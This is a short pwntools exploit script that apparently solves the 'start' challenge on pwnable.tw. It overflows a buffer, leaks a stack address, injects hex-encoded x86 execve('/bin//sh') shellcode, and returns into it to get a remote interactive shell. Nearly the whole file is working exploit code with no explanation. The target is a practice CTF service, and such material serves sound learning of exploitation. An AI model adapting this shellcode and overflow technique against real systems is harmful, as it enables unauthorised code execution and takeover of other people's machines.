from pwn import *

# r = process('./start')
# gdb.attach(r, api=True,gdbscript='''
#            b*0x0804809c
#            ''')

r = remote(b'chall.pwnable.tw', 10000)

start = 0x08048060
s_write = 0x08048087
ret = 0x0804809c

payload = b'a'*20 +  p32(s_write) + b'1111' + b"2222"

# b"\xB8\x0B\x00\x00\x00\x6A\x00\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x31\xC9\x31\xD2\xCD\x80"

r.sendafter(b'the CTF:', payload)
r.recvuntil(b'2222')
out = r.recvuntil(b'\xff')
stack = u32(out)
print(hex(stack))

payload = b'a'*20 +  p32(start) + b"\xB8\x0B\x00\x00\x00\x6A\x00\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x31\xC9\x31\xD2\xCD\x80"

#' b"\xB8\x0B\x00\x00\x00\x6A\x00\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x31\xC9\x31\xD2\xCD\x80"
r.send(payload)

payload = b'a'*20 +  p32(ret)
r.sendafter(b'the CTF:', payload)
r.interactive()